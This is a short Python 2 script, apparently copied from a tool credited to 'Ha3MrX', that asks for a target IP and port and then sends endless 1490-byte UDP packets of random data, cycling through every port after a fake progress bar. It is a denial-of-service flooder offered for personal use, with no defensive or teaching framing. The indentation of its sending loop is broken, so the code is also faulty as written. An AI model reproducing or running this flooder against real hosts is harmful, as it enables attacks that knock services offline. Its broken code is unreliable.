# THIS IS NOT MY CODE
# I JUST COPIED IT FROM Ha3MrX
# BUT I REMOVED SOME STUFF TO MAKE IT EASIER FOR MY PERSONAL USE




import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")


ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
os.system("clear")
print "[=====               ] 25%"
time.sleep(5)
os.system("clear")
print "[==========          ] 50%"
time.sleep(5)
os.system("clear")
print "[===============     ] 75%"
time.sleep(5)
os.system("clear")
print "[====================] 100%"
time.sleep(3)
os.system("clear")
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
        port = port + 1
            print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
            if port == 65534:
                port = 1
